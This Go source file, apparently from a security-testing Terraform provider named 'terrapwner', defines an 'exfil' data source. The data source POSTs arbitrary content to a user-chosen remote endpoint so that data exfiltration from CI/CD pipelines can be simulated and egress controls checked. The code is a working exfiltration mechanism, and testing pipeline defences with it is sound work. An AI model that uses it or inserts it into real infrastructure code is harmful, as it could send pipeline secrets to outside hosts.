// Copyright (c) Datadog, Inc.
// SPDX-License-Identifier: Apache-2.0

package provider

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"terraform-provider-terrapwner/internal/utils"

	"github.com/hashicorp/terraform-plugin-framework/datasource"
	"github.com/hashicorp/terraform-plugin-framework/datasource/schema"
	"github.com/hashicorp/terraform-plugin-framework/types"
)

// Ensure the implementation satisfies the expected interfaces.
var (
	_ datasource.DataSource              = &TerrapwnerExfilDataSource{}
	_ datasource.DataSourceWithConfigure = &TerrapwnerExfilDataSource{}
)

// TerrapwnerExfilDataSource is the data source implementation.
type TerrapwnerExfilDataSource struct {
	client *http.Client
}

// TerrapwnerExfilDataSourceModel describes the data source data model.
type TerrapwnerExfilDataSourceModel struct {
	Content       types.String `tfsdk:"content"`
	Endpoint      types.String `tfsdk:"endpoint"`
	Timeout       types.Int64  `tfsdk:"timeout"`
	ExpectSuccess types.Bool   `tfsdk:"expect_success"`
	Success       types.Bool   `tfsdk:"success"`
	FailReason    types.String `tfsdk:"fail_reason"`
	ResponseCode  types.Int64  `tfsdk:"response_code"`
}

// NewTerrapwnerExfilDataSource is a helper function to simplify the provider implementation.
func NewTerrapwnerExfilDataSource() datasource.DataSource {
	return &TerrapwnerExfilDataSource{}
}

// Metadata returns the data source type name.
func (d *TerrapwnerExfilDataSource) Metadata(_ context.Context, req datasource.MetadataRequest, resp *datasource.MetadataResponse) {
	resp.TypeName = req.ProviderTypeName + "_exfil"
}

// Schema defines the schema for the data source.
func (d *TerrapwnerExfilDataSource) Schema(_ context.Context, _ datasource.SchemaRequest, resp *datasource.SchemaResponse) {
	resp.Schema = schema.Schema{
		Description: "Simulates or assesses data exfiltration from a Terraform CI/CD pipeline by sending content to a remote HTTP endpoint.",
		Attributes: map[string]schema.Attribute{
			"content": schema.StringAttribute{
				Description: "The string content to exfiltrate.",
				Required:    true,
			},
			"endpoint": schema.StringAttribute{
				Description: "The full URL to send the POST request to.",
				Required:    true,
			},
			"timeout": schema.Int64Attribute{
				Description: "Timeout in seconds for the HTTP request (default: 10).",
				Optional:    true,
			},
			"expect_success": schema.BoolAttribute{
				Description: "Whether a failed exfil is expected or not.",
				Optional:    true,
			},
			"success": schema.BoolAttribute{
				Description: "True if HTTP response code is 2xx.",
				Computed:    true,
			},
			"fail_reason": schema.StringAttribute{
				Description: "If failed, stores the error message.",
				Computed:    true,
			},
			"response_code": schema.Int64Attribute{
				Description: "HTTP response status code.",
				Computed:    true,
			},
		},
	}
}

// Configure adds the provider configured client to the data source.
func (d *TerrapwnerExfilDataSource) Configure(_ context.Context, req datasource.ConfigureRequest, resp *datasource.ConfigureResponse) {
	if req.ProviderData == nil {
		return
	}
}

// Read refreshes the Terraform state with the latest data.
func (d *TerrapwnerExfilDataSource) Read(ctx context.Context, req datasource.ReadRequest, resp *datasource.ReadResponse) {
	var data TerrapwnerExfilDataSourceModel

	// Read Terraform configuration data into the model
	resp.Diagnostics.Append(req.Config.Get(ctx, &data)...)
	if resp.Diagnostics.HasError() {
		return
	}

	// Set default values
	if data.ExpectSuccess.IsNull() {
		data.ExpectSuccess = types.BoolValue(true)
	}

	// Set timeout with default of 10 seconds
	timeout := int64(10)
	if !data.Timeout.IsNull() {
		timeout = data.Timeout.ValueInt64()
	}

	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: time.Duration(timeout) * time.Second,
	}

	// Prepare the request payload
	payload := map[string]interface{}{
		"content": data.Content.ValueString(),
	}

	// Convert payload to JSON
	jsonData, err := json.Marshal(payload)
	if err != nil {
		resp.Diagnostics.AddError(
			"JSON Encoding Error",
			fmt.Sprintf("Failed to encode payload: %v", err),
		)
		return
	}

	// Create the request
	httpReq, err := http.NewRequestWithContext(ctx, "POST", data.Endpoint.ValueString(), bytes.NewBuffer(jsonData))
	if err != nil {
		resp.Diagnostics.AddError(
			"Request Creation Error",
			fmt.Sprintf("Failed to create request: %v", err),
		)
		return
	}

	// Set headers
	httpReq.Header.Set("Content-Type", "application/json")
	httpReq.Header.Set("User-Agent", utils.GetUserAgent())

	// Send the request
	httpResp, err := client.Do(httpReq)
	if err != nil {
		data.Success = types.BoolValue(false)
		data.FailReason = types.StringValue(fmt.Sprintf("Request failed: %v", err))
		data.ResponseCode = types.Int64Value(0)
		resp.Diagnostics.Append(resp.State.Set(ctx, &data)...)
		return
	}
	defer httpResp.Body.Close()

	// Read response body
	body, err := io.ReadAll(httpResp.Body)
	if err != nil {
		data.Success = types.BoolValue(false)
		data.FailReason = types.StringValue(fmt.Sprintf("Failed to read response: %v", err))
		data.ResponseCode = types.Int64Value(int64(httpResp.StatusCode))
		resp.Diagnostics.Append(resp.State.Set(ctx, &data)...)
		return
	}

	// Check response status
	isSuccess := httpResp.StatusCode >= 200 && httpResp.StatusCode < 300
	data.Success = types.BoolValue(isSuccess)
	data.ResponseCode = types.Int64Value(int64(httpResp.StatusCode))

	if !isSuccess {
		data.FailReason = types.StringValue(fmt.Sprintf("HTTP %d: %s", httpResp.StatusCode, string(body)))
	}

	// If we expect success but didn't get it, add an error
	if data.ExpectSuccess.ValueBool() && !isSuccess {
		resp.Diagnostics.AddError(
			"Exfiltration Failed",
			fmt.Sprintf("Expected successful exfiltration but got HTTP %d: %s", httpResp.StatusCode, string(body)),
		)
		return
	}

	// Save data into Terraform state
	resp.Diagnostics.Append(resp.State.Set(ctx, &data)...)
}
